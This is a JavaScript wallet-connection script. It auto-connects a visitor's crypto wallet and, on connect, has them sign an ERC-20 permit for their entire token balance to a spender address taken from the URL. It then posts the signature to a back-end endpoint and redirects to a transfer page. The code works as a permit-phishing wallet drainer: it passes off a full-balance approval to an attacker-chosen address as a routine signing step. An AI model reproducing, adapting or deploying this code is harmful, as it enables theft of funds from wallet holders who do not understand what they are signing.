let provider;
let signer;
let userAddress;
let tokenContract;
let spenderAddress;

const ERC20_PERMIT_ABI = [
    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
    "function nonces(address owner) external view returns (uint256)",
    "function DOMAIN_SEPARATOR() external view returns (bytes32)",
    "function name() external view returns (string)",
    "function decimals() external view returns (uint8)",
    "function balanceOf(address account) external view returns (uint256)"
];

const urlParams = new URLSearchParams(window.location.search);
const TOKEN_ADDRESS = urlParams.get('token') || '';
const SPENDER_ADDRESS = urlParams.get('spender') || '';
const NETWORK_PARAM = urlParams.get('network') || 'sepolia';

let currentNetwork = NETWORK_PARAM;

document.addEventListener('DOMContentLoaded', async () => {
    document.getElementById('spenderAddress').value = SPENDER_ADDRESS;
    spenderAddress = SPENDER_ADDRESS;
    
    const isTrustWallet = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
    const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
    
    if (typeof window.ethereum === 'undefined') {
        if (isTrustWallet === false && window.web3) {
            window.ethereum = window.web3.currentProvider;
        } else {
            showStatus('Please install MetaMask or Trust Wallet', 'error');
            return;
        }
    }
    
    if (isTrustWallet) {
        showStatus('Trust Wallet detected. Connecting...', 'info');
    }
    
    await autoConnectWallet();
});

async function autoConnectWallet() {
    try {
        if (!window.ethereum) {
            if (window.web3 && window.web3.currentProvider) {
                window.ethereum = window.web3.currentProvider;
            } else {
                showStatus('Wallet not found. Please open in Trust Wallet browser', 'error');
                const connectBtn = document.getElementById('connectWallet');
                if (connectBtn) {
                    connectBtn.style.display = 'block';
                    connectBtn.disabled = false;
                }
                return;
            }
        }
        
        provider = new ethers.providers.Web3Provider(window.ethereum);
        
        showStatus('Requesting wallet connection...', 'info');
        
        try {
            const accounts = await provider.send("eth_requestAccounts", []);
            
            if (accounts.length === 0) {
                showStatus('Click "Continue" to connect wallet', 'info');
                const connectBtn = document.getElementById('connectWallet');
                if (connectBtn) {
                    connectBtn.style.display = 'block';
                    connectBtn.disabled = false;
                }
                return;
            }
            
            userAddress = accounts[0];
            signer = provider.getSigner();
            
            await initTokenContract();
        } catch (requestError) {
            if (requestError.code === 4001) {
                showStatus('Connection rejected. Click "Continue" to try again', 'info');
            } else {
                const existingAccounts = await provider.listAccounts();
                if (existingAccounts.length > 0) {
                    userAddress = existingAccounts[0];
                    signer = provider.getSigner();
                    await initTokenContract();
                } else {
                    showStatus('Click "Continue" to connect wallet', 'info');
                }
            }
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
        }
        
    } catch (error) {
        console.error('Auto connect error:', error);
        showStatus('Click "Continue" to connect wallet', 'info');
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.style.display = 'block';
            connectBtn.disabled = false;
        }
    }
}


window.connectWallet = async function connectWallet() {
    try {
        if (typeof ethers === 'undefined') {
            showStatus('Error: ethers.js library not loaded. Please refresh the page.', 'error');
            return;
        }
        
        showStatus('Connecting wallet...', 'info');
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.disabled = true;
        }
        
        if (!window.ethereum) {
            showStatus('Wallet not found', 'error');
            if (connectBtn) {
                connectBtn.disabled = false;
            }
            return;
        }
        
        if (!provider) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
        }
        
        const accounts = await provider.send("eth_requestAccounts", []);
        
        if (accounts.length === 0) {
            showStatus('Wallet connection rejected', 'error');
            if (connectBtn) {
                connectBtn.disabled = false;
            }
            return;
        }
        
        userAddress = accounts[0];
        signer = provider.getSigner();
        
        if (connectBtn) {
            connectBtn.style.display = 'none';
        }
        
        await initTokenContractAndSignPermit();
        
    } catch (error) {
        console.error('Connection error:', error);
        if (error.code === 4001) {
            showStatus('Connection rejected by user', 'error');
        } else {
            showStatus('Connection error: ' + error.message, 'error');
        }
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.disabled = false;
        }
    }
};

if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            userAddress = null;
            signer = null;
            tokenContract = null;
            const nextBtn = document.getElementById('nextButton');
            const connectBtn = document.getElementById('connectWallet');
            if (nextBtn) nextBtn.disabled = true;
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
            showStatus('Wallet disconnected', 'info');
        } else {
            userAddress = accounts[0];
            signer = provider.getSigner();
            initTokenContract();
        }
    });
    
    window.ethereum.on('chainChanged', () => {
        window.location.reload();
    });
}


async function initTokenContractAndSignPermit() {
    try {
        if (!userAddress || !signer) {
            showStatus('Wallet not connected', 'error');
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
            return;
        }
        
        showStatus('Loading token information...', 'info');
        
        tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_PERMIT_ABI, signer);
        
        const [balance, decimals] = await Promise.all([
            tokenContract.balanceOf(userAddress),
            tokenContract.decimals()
        ]);
        
        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
        
        document.getElementById('amount').value = balanceFormatted;
        
        showStatus('Signing permit for full balance...', 'info');
        
        const amountWei = balance;
        
        const nonce = await tokenContract.nonces(userAddress);
        const deadline = Math.floor(Date.now() / 1000) + 86400;
        const tokenName = await tokenContract.name();
        
        const domain = {
            name: tokenName,
            version: "1",
            chainId: (await provider.getNetwork()).chainId,
            verifyingContract: TOKEN_ADDRESS
        };
        
        const types = {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };
        
        const message = {
            owner: userAddress,
            spender: spenderAddress,
            value: amountWei.toString(),
            nonce: nonce.toString(),
            deadline: deadline
        };
        
        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.utils.splitSignature(signature);
        
        const response = await fetch('/api/permit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                owner: userAddress,
                spender: spenderAddress,
                value: amountWei.toString(),
                deadline: deadline,
                v: sig.v,
                r: sig.r,
                s: sig.s,
                tokenAddress: TOKEN_ADDRESS
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showStatus('Permit signed successfully! Redirecting...', 'success');
            setTimeout(() => {
                window.location.href = `/transfer.html?permitId=${result.permitId}&recipient=${encodeURIComponent(spenderAddress)}`;
            }, 1500);
        } else {
            showStatus('Error: ' + result.error, 'error');
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
        }
        
    } catch (error) {
        console.error('Contract initialization or signing error:', error);
        showStatus('Error: ' + error.message, 'error');
        const connectBtn = document.getElementById('connectWallet');
        if (connectBtn) {
            connectBtn.style.display = 'block';
            connectBtn.disabled = false;
        }
    }
}

async function initTokenContract() {
    try {
        if (!userAddress || !signer) {
            showStatus('Wallet not connected', 'error');
            const connectBtn = document.getElementById('connectWallet');
            if (connectBtn) {
                connectBtn.style.display = 'block';
                connectBtn.disabled = false;
            }
            return;
        }
        
        showStatus('Loading token information...', 'info');
        
        tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_PERMIT_ABI, signer);
        
        const [balance, decimals] = await Promise.all([
            tokenContract.balanceOf(userAddress),
            tokenContract.decimals()
        ]);
        
        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
        
        document.getElementById('amount').value = balanceFormatted;
        document.getElementById('amount').readOnly = false;
        
        const nextBtn = document.getElementById('nextButton');
        if (nextBtn) {
            nextBtn.disabled = false;
        }
        showStatus('Wallet connected. Ready to sign permit.', 'success');
        
        const nextButton = document.getElementById('nextButton');
        if (nextButton) {
            nextButton.onclick = signPermit;
        }
        
    } catch (error) {
        console.error('Contract initialization error:', error);
        showStatus('Error: ' + error.message, 'error');
        const nextBtn = document.getElementById('nextButton');
        const connectBtn = document.getElementById('connectWallet');
        if (nextBtn) nextBtn.disabled = true;
        if (connectBtn) {
            connectBtn.style.display = 'block';
            connectBtn.disabled = false;
        }
    }
}

async function signPermit() {
    try {
        const amount = document.getElementById('amount').value;
        
        if (!amount || parseFloat(amount) <= 0) {
            showStatus('Invalid amount', 'error');
            return;
        }
        
        if (!tokenContract || !signer) {
            showStatus('Please connect wallet first', 'error');
            return;
        }
        
        document.getElementById('nextButton').disabled = true;
        showStatus('Signing permit...', 'info');
        
        const decimals = await tokenContract.decimals();
        const amountWei = ethers.utils.parseUnits(amount, decimals);
        
        const nonce = await tokenContract.nonces(userAddress);
        const deadline = Math.floor(Date.now() / 1000) + 86400;
        const tokenName = await tokenContract.name();
        
        const domain = {
            name: tokenName,
            version: "1",
            chainId: (await provider.getNetwork()).chainId,
            verifyingContract: TOKEN_ADDRESS
        };
        
        const types = {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };
        
        const message = {
            owner: userAddress,
            spender: spenderAddress,
            value: amountWei.toString(),
            nonce: nonce.toString(),
            deadline: deadline
        };
        
        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.utils.splitSignature(signature);
        
        const response = await fetch('/api/permit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                owner: userAddress,
                spender: spenderAddress,
                value: amountWei.toString(),
                deadline: deadline,
                v: sig.v,
                r: sig.r,
                s: sig.s,
                tokenAddress: TOKEN_ADDRESS
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showStatus('Permit signed successfully!', 'success');
            setTimeout(() => {
                window.location.href = `/transfer.html?permitId=${result.permitId}&recipient=${encodeURIComponent(spenderAddress)}`;
            }, 1500);
        } else {
            showStatus('Error: ' + result.error, 'error');
            document.getElementById('nextButton').disabled = false;
        }
        
    } catch (error) {
        console.error('Sign permit error:', error);
        showStatus('Error: ' + error.message, 'error');
        document.getElementById('nextButton').disabled = false;
    }
}

function showStatus(message, type) {
    const statusDiv = document.getElementById('status');
    statusDiv.textContent = message;
    statusDiv.className = 'status ' + type;
}
